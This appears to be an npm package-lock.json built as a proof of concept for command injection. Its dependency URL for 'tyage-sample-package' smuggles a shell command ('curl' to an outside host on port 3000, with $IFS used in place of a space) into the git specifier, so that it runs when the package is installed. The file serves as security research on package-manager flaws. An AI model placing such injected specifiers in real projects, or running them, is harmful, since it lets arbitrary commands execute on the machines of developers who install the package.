{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "version": "1.0.0",
      "license": "MIT",
      "dependencies": {
        "tyage-sample-package": "ssh+https://github.com/tyage//sample-package#;curl$IFS@mocos.kitchen:3000;github.com/tyage/sample-package#semver:5.0.0"
      }
    },
    "node_modules/tyage-sample-package": {
      "resolved": "ssh+https:/github.com/tyage/sample-package#8b7e1769b6df4461c8e89e6d0a2035c4512409cd",
      "link": true
    },
    "ssh+https:/github.com/tyage/sample-package#8b7e1769b6df4461c8e89e6d0a2035c4512409cd": {}
  },
  "dependencies": {
    "tyage-sample-package": {
      "version": "file:ssh+https:/github.com/tyage/sample-package#8b7e1769b6df4461c8e89e6d0a2035c4512409cd"
    }
  }
}
